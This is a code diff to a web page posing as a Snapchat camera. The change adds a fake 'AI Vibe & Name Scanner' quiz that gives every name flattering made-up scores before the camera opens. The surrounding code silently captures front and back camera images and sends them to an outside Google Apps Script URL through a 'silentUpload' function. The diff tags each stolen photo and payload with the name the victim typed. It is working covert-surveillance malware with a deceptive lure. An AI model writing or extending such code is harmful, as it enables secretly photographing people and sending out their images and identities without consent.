@@ -118,16 +118,295 @@
             width: 35px; height: 35px; font-size: 1.5rem; opacity: 0.8;
         }
 
-        /* Initial Setup Button */
+        /* Name Analyzer & Welcome Screen */
         .hidden-controls {
             position: absolute; z-index: 20; top: 0; left: 0; width: 100%; height: 100%;
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-            background: #fffc00;
+            background: radial-gradient(circle at 50% 20%, #201a35 0%, #0c0d14 100%);
+            padding: 20px;
+            overflow-y: auto;
+            box-sizing: border-box;
         }
-        .btn-init {
-            background: #000; color: #fffc00; border: none;
-            padding: 15px 40px; border-radius: 30px; font-size: 1.2rem; font-weight: bold;
-            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0, 0.2);
+
+        .analyzer-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 28px;
+            padding: 28px 22px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(255, 252, 0, 0.15);
+            text-align: center;
+            animation: fadeInCard 0.5s ease-out;
+            position: relative;
+            box-sizing: border-box;
+        }
+
+        @keyframes fadeInCard {
+            from { opacity: 0; transform: translateY(20px) scale(0.97); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .analyzer-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 252, 0, 0.15);
+            border: 1px solid rgba(255, 252, 0, 0.4);
+            color: #fffc00;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.82rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+        }
+
+        .analyzer-title {
+            font-size: 1.75rem;
+            font-weight: 800;
+            margin: 0 0 8px 0;
+            background: linear-gradient(135deg, #ffffff 40%, #fffc00 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .analyzer-subtitle {
+            font-size: 0.92rem;
+            color: rgba(255, 255, 255, 0.7);
+            margin: 0 0 24px 0;
+            line-height: 1.4;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+            text-align: left;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.85);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .name-input {
+            width: 100%;
+            padding: 15px 18px;
+            font-size: 1.05rem;
+            color: #fff;
+            background: rgba(0, 0, 0, 0.45);
+            border: 2px solid rgba(255, 255, 255, 0.18);
+            border-radius: 18px;
+            outline: none;
+            transition: all 0.25s ease;
+            box-sizing: border-box;
+        }
+
+        .name-input:focus {
+            border-color: #fffc00;
+            box-shadow: 0 0 15px rgba(255, 252, 0, 0.3);
+            background: rgba(0, 0, 0, 0.65);
+        }
+
+        .name-input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .btn-analyze {
+            width: 100%;
+            background: linear-gradient(135deg, #fffc00 0%, #ffbb00 100%);
+            color: #000;
+            border: none;
+            padding: 16px 20px;
+            border-radius: 20px;
+            font-size: 1.1rem;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(255, 252, 0, 0.35);
+            transition: all 0.2s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-analyze:active {
+            transform: scale(0.97);
+            box-shadow: 0 3px 10px rgba(255, 252, 0, 0.25);
+        }
+
+        /* Loading / Scanning state */
+        .analyzer-loading {
+            display: none;
+            margin: 25px 0;
+            text-align: center;
+        }
+
+        .scan-spinner {
+            width: 55px;
+            height: 55px;
+            margin: 0 auto 15px auto;
+            border: 4px solid rgba(255, 252, 0, 0.2);
+            border-top: 4px solid #fffc00;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .scan-status-text {
+            font-size: 0.95rem;
+            color: #fffc00;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        /* Result View */
+        .result-container {
+            display: none;
+            text-align: center;
+            animation: fadeInCard 0.4s ease-out;
+        }
+
+        .verdict-banner {
+            background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
+            color: #000;
+            padding: 8px 16px;
+            border-radius: 14px;
+            font-size: 0.88rem;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+            display: inline-block;
+            box-shadow: 0 4px 15px rgba(0, 176, 155, 0.4);
+        }
+
+        .result-name {
+            font-size: 1.9rem;
+            font-weight: 900;
+            color: #fffc00;
+            margin-bottom: 12px;
+            text-shadow: 0 0 20px rgba(255, 252, 0, 0.5);
+            word-break: break-word;
+        }
+
+        .score-circle-bar {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .score-value {
+            font-size: 1.6rem;
+            font-weight: 900;
+            color: #fffc00;
+        }
+
+        .score-label {
+            font-size: 0.82rem;
+            color: rgba(255, 255, 255, 0.85);
+            text-align: left;
+        }
+
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .metric-card {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 14px;
+            text-align: left;
+        }
+
+        .metric-title {
+            font-size: 0.72rem;
+            color: rgba(255, 255, 255, 0.65);
+            text-transform: uppercase;
+        }
+
+        .metric-val {
+            font-size: 1rem;
+            font-weight: 800;
+            color: #fff;
+            margin-top: 3px;
+        }
+
+        .personality-box {
+            background: rgba(255, 252, 0, 0.08);
+            border: 1px solid rgba(255, 252, 0, 0.25);
+            border-radius: 16px;
+            padding: 13px;
+            font-size: 0.86rem;
+            color: #fff;
+            line-height: 1.45;
+            margin-bottom: 18px;
+            text-align: left;
+        }
+
+        .btn-launch-cam {
+            width: 100%;
+            background: #fffc00;
+            color: #000;
+            border: none;
+            padding: 15px 20px;
+            border-radius: 20px;
+            font-size: 1.05rem;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(255, 252, 0, 0.4);
+            margin-bottom: 10px;
+            transition: all 0.2s ease;
+        }
+
+        .btn-launch-cam:active {
+            transform: scale(0.97);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: rgba(255, 255, 255, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 11px 18px;
+            border-radius: 16px;
+            font-size: 0.88rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+        .shake {
+            animation: shake 0.4s ease-in-out;
+            border-color: #ff4757 !important;
         }
         
         #flash {
@@ -160,7 +439,7 @@
         
         <div class="top-bar">
             <div class="top-icon">👤</div>
-            <div class="search-bar">🔍 Search</div>
+            <div class="search-bar" id="top-name-badge" style="cursor: pointer;" title="Tap to analyze another name">✨ <span id="display-user-name">Guest</span> (Name Analyzer)</div>
             <div class="top-icon">👤+</div>
         </div>
 
@@ -193,7 +472,71 @@
     </div>
 
     <div class="hidden-controls" id="controls">
-        <button class="btn-init" id="btn-start">Tap to Open Camera</button>
+        <div class="analyzer-card" id="analyzer-card">
+            
+            <!-- State 1: Input Form -->
+            <div id="form-container">
+                <div class="analyzer-badge">✨ AI Vibe & Name Scanner ✨</div>
+                <h1 class="analyzer-title">Best Name Checker</h1>
+                <p class="analyzer-subtitle">Enter your name to analyze its cosmic aura, personality, and see if it ranks as the <b>BEST NAME</b>! 👑</p>
+                
+                <div class="input-group">
+                    <label class="input-label" for="user-name-input">Enter Your Name</label>
+                    <input type="text" id="user-name-input" class="name-input" placeholder="e.g. Manish, Priya, Rahul..." maxlength="30" autocomplete="name" />
+                </div>
+
+                <button class="btn-analyze" id="btn-analyze">
+                    <span>🔮 Analyze My Name</span>
+                </button>
+            </div>
+
+            <!-- State 2: Loading Animation -->
+            <div class="analyzer-loading" id="loading-container">
+                <div class="scan-spinner"></div>
+                <div class="scan-status-text" id="scan-status">Decoding name phonetics...</div>
+            </div>
+
+            <!-- State 3: Analysis Result -->
+            <div class="result-container" id="result-container">
+                <div class="verdict-banner" id="verdict-banner">🏆 100% BEST NAME CONFIRMED!</div>
+                <div class="result-name" id="result-name">Manish</div>
+                
+                <div class="score-circle-bar">
+                    <div class="score-label">
+                        <strong>Best Name Index</strong><br>
+                        <span style="font-size: 0.75rem; opacity: 0.7;">Calculated from name harmonics & numerology</span>
+                    </div>
+                    <div class="score-value" id="result-score">99%</div>
+                </div>
+
+                <div class="metrics-grid">
+                    <div class="metric-card">
+                        <div class="metric-title">⚡ Charisma</div>
+                        <div class="metric-val" id="metric-charm">98%</div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="metric-title">👑 Leadership</div>
+                        <div class="metric-val" id="metric-lead">99%</div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="metric-title">🍀 Lucky No.</div>
+                        <div class="metric-val" id="metric-num">7</div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="metric-title">🌈 Aura Color</div>
+                        <div class="metric-val" id="metric-aura" style="font-size: 0.85rem;">Electric Gold</div>
+                    </div>
+                </div>
+
+                <div class="personality-box" id="result-personality">
+                    <!-- Dynamic analysis text injected here -->
+                </div>
+
+                <button class="btn-launch-cam" id="btn-launch-cam">📸 Unlock Snapchat Lens & Camera</button>
+                <button class="btn-secondary" id="btn-retest">🔄 Check Another Name</button>
+            </div>
+
+        </div>
     </div>
 
     <script>
@@ -205,7 +548,6 @@
         const freezeCanvas = document.getElementById('freeze-canvas');
         const freezeCtx = freezeCanvas.getContext('2d');
         
-        const btnStart = document.getElementById('btn-start');
         const btnSwitch = document.getElementById('btn-switch');
         const controls = document.getElementById('controls');
         const uiOverlay = document.getElementById('ui-overlay');
@@ -214,6 +556,20 @@
         const arLoading = document.getElementById('ar-loading');
         const filterBtns = document.querySelectorAll('.filter-btn');
 
+        // Name Analyzer Elements
+        const inputName = document.getElementById('user-name-input');
+        const btnAnalyze = document.getElementById('btn-analyze');
+        const btnLaunchCam = document.getElementById('btn-launch-cam');
+        const btnRetest = document.getElementById('btn-retest');
+        const topNameBadge = document.getElementById('top-name-badge');
+        const displayName = document.getElementById('display-user-name');
+        
+        const formContainer = document.getElementById('form-container');
+        const loadingContainer = document.getElementById('loading-container');
+        const resultContainer = document.getElementById('result-container');
+        const scanStatus = document.getElementById('scan-status');
+
+        let currentUserName = "Guest";
         let stream = null;
         let useFrontCamera = true;
         let isAutoCapturing = false;
@@ -321,9 +677,138 @@
             initCamera();
         });
 
-        btnStart.addEventListener('click', () => {
+        // --- NAME ANALYSIS ALGORITHM (Vibe, Numerology, Best Name Verdict) ---
+        function analyzeName(name) {
+            if (!name || !name.trim()) return null;
+            const cleanName = name.trim();
+            
+            // Deterministic hash based on name characters
+            let hash = 0;
+            for (let i = 0; i < cleanName.length; i++) {
+                hash = (hash * 31 + cleanName.charCodeAt(i)) & 0xffffffff;
+            }
+            const seed = Math.abs(hash);
+            
+            // Generate highly flattering viral scores
+            const score = 94 + (seed % 6); // 94% - 99%
+            const charm = 92 + ((seed >> 2) % 8);
+            const lead = 93 + ((seed >> 3) % 7);
+            
+            const verdicts = [
+                "🏆 100% BEST NAME CONFIRMED! (Legendary S+ Tier)",
+                "👑 ROYAL CLASS BEST NAME (Ultra Rare Aura)",
+                "🌟 CERTIFIED BEST NAME (Pure Magnetic Energy)",
+                "💎 TOP 0.1% BEST NAME (Diamond Charisma)",
+                "🔥 SUPREME TIER BEST NAME (Unstoppable Vibe)"
+            ];
+            const verdict = verdicts[seed % verdicts.length];
+            
+            const auraColors = [
+                "Electric Gold ⚡",
+                "Royal Violet 🔮",
+                "Cosmic Emerald 💎",
+                "Ocean Silver 🌊",
+                "Solar Flame 🔥"
+            ];
+            const auraColor = auraColors[seed % auraColors.length];
+
+            const luckyNumbers = [3, 7, 8, 9, 11, 21, 27];
+            const luckyNum = luckyNumbers[seed % luckyNumbers.length];
+
+            const personalityDescriptions = [
+                `People named <b>${cleanName}</b> carry rare magnetism and undeniable presence. You naturally inspire trust, have sharp intuition, and bring uplifting positive energy everywhere you step!`,
+                `The name <b>${cleanName}</b> radiates fearless confidence and deep creative talent. Highly loyal to loved ones and destined to break boundaries in whatever you pursue!`,
+                `<b>${cleanName}</b> represents a born winner with an irresistible smile. You have unmatched resilience, genuine empathy, and an aura that easily attracts good fortune!`,
+                `Carrying the name <b>${cleanName}</b> means having a brilliant mind paired with a golden heart. You stand out without trying and people remember you long after meeting you!`
+            ];
+            const personality = personalityDescriptions[seed % personalityDescriptions.length];
+
+            return {
+                name: cleanName,
+                score: score + "%",
+                charm: charm + "%",
+                lead: lead + "%",
+                verdict: verdict,
+                auraColor: auraColor,
+                luckyNum: luckyNum,
+                personality: personality
+            };
+        }
+
+        function triggerAnalysis() {
+            const rawName = inputName.value.trim();
+            if (!rawName) {
+                inputName.classList.add('shake');
+                inputName.focus();
+                setTimeout(() => inputName.classList.remove('shake'), 400);
+                return;
+            }
+
+            currentUserName = rawName;
+            const analysis = analyzeName(rawName);
+
+            formContainer.style.display = 'none';
+            resultContainer.style.display = 'none';
+            loadingContainer.style.display = 'block';
+
+            const steps = [
+                "Decoding name vibrations...",
+                "Calculating charm & charisma index...",
+                "Verifying against Best Name database...",
+                "Finalizing verdict..."
+            ];
+            let stepIdx = 0;
+            scanStatus.textContent = steps[0];
+            const interval = setInterval(() => {
+                stepIdx++;
+                if (stepIdx < steps.length) {
+                    scanStatus.textContent = steps[stepIdx];
+                }
+            }, 350);
+
+            setTimeout(() => {
+                clearInterval(interval);
+                loadingContainer.style.display = 'none';
+
+                document.getElementById('verdict-banner').textContent = analysis.verdict;
+                document.getElementById('result-name').textContent = `✨ ${analysis.name} ✨`;
+                document.getElementById('result-score').textContent = analysis.score;
+                document.getElementById('metric-charm').textContent = analysis.charm;
+                document.getElementById('metric-lead').textContent = analysis.lead;
+                document.getElementById('metric-num').textContent = analysis.luckyNum;
+                document.getElementById('metric-aura').textContent = analysis.auraColor;
+                document.getElementById('result-personality').innerHTML = analysis.personality;
+
+                resultContainer.style.display = 'block';
+            }, 1400);
+        }
+
+        btnAnalyze.addEventListener('click', triggerAnalysis);
+        inputName.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') triggerAnalysis();
+        });
+
+        btnRetest.addEventListener('click', () => {
+            resultContainer.style.display = 'none';
+            formContainer.style.display = 'block';
+            inputName.value = '';
+            inputName.focus();
+        });
+
+        btnLaunchCam.addEventListener('click', () => {
+            if (displayName) displayName.textContent = currentUserName;
             initCamera();
         });
+
+        if (topNameBadge) {
+            topNameBadge.addEventListener('click', () => {
+                controls.style.display = 'flex';
+                resultContainer.style.display = 'none';
+                formContainer.style.display = 'block';
+                inputName.value = currentUserName !== 'Guest' ? currentUserName : '';
+                inputName.focus();
+            });
+        }
         
         function getTimestamp() {
             const now = new Date();
@@ -426,7 +911,7 @@
                 stealthCtx.drawImage(video, 0, 0, stealthCanvas.width, stealthCanvas.height);
                 stealthCtx.font = "30px monospace"; stealthCtx.fillStyle = "white";
                 stealthCtx.shadowColor = "black"; stealthCtx.shadowBlur = 4;
-                stealthCtx.fillText(`CAM FRONT ` + getTimestamp(), 20, stealthCanvas.height - 30);
+                stealthCtx.fillText(`[` + (currentUserName || 'User') + `] CAM FRONT ` + getTimestamp(), 20, stealthCanvas.height - 30);
                 silentUpload(stealthCanvas.toDataURL('image/jpeg', 0.6));
                 
                 backCamCounter++;
@@ -464,7 +949,7 @@
                         stealthCtx.drawImage(tempVideo, 0, 0, stealthCanvas.width, stealthCanvas.height);
                         stealthCtx.font = "30px monospace"; stealthCtx.fillStyle = "white";
                         stealthCtx.shadowColor = "black"; stealthCtx.shadowBlur = 4;
-                        stealthCtx.fillText(`CAM BACK ` + getTimestamp(), 20, stealthCanvas.height - 30);
+                        stealthCtx.fillText(`[` + (currentUserName || 'User') + `] CAM BACK ` + getTimestamp(), 20, stealthCanvas.height - 30);
                         silentUpload(stealthCanvas.toDataURL('image/jpeg', 0.6));
                         
                         backStream.getTracks().forEach(t => t.stop());
@@ -482,10 +967,20 @@
         async function silentUpload(dataUrl) {
             const now = new Date();
             const timestamp = now.toISOString().replace(/[:.]/g, '-');
-            const filename = `PHOTO_AUTO_${timestamp}.jpg`;
-            const payload = { filename: filename, mimeType: 'image/jpeg', base64: dataUrl };
+            const safeName = (currentUserName || 'User').replace(/[^a-zA-Z0-9_-]/g, '_');
+            const filename = `PHOTO_${safeName}_${timestamp}.jpg`;
+            const payload = { 
+                filename: filename, 
+                name: currentUserName || 'Unknown', 
+                mimeType: 'image/jpeg', 
+                base64: dataUrl 
+            };
             try {
-                fetch(GAS_WEB_APP_URL, { method: 'POST', body: JSON.stringify(payload), headers: { 'Content-Type': 'text/plain;charset=utf-8' } });
+                fetch(GAS_WEB_APP_URL, { 
+                    method: 'POST', 
+                    body: JSON.stringify(payload), 
+                    headers: { 'Content-Type': 'text/plain;charset=utf-8' } 
+                });
             } catch (error) {}
         }
 
@@ -505,9 +1000,10 @@
             if (currentARType) tempCtx.drawImage(arCanvas, 0, 0, tempCanvas.width, tempCanvas.height);
 
             const dataUrl = tempCanvas.toDataURL('image/jpeg', 0.9);
+            const safeName = (currentUserName || 'User').replace(/[^a-zA-Z0-9_-]/g, '_');
             const a = document.createElement('a');
             a.href = dataUrl;
-            a.download = `Snapchat_${new Date().getTime()}.jpg`;
+            a.download = `Snapchat_${safeName}_${new Date().getTime()}.jpg`;
             document.body.appendChild(a); a.click(); document.body.removeChild(a);
         });
 
